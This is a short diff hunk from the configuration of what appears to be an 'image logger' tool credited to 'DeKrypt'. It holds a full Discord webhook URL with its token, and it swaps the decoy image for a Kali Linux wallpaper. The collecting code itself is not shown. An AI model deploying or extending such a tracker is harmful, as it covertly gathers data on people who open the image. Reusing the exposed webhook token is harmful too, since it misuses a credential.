@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1472608754490146941/nFYeW8gPq4qxsXN-pxBuOkOL8miLiHEmbstwmE8wrCks60l_snY-CYLSO0il-qgA_PF1",
-    "image": "https://geekflare.com/wp-content/uploads/2023/03/From-the-profile-view-page-1.png", # You can also have a custom image by using a URL argument
+    "image": "https://images.hdqwalls.com/download/kali-linux-operating-system-oq-3840x2400.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
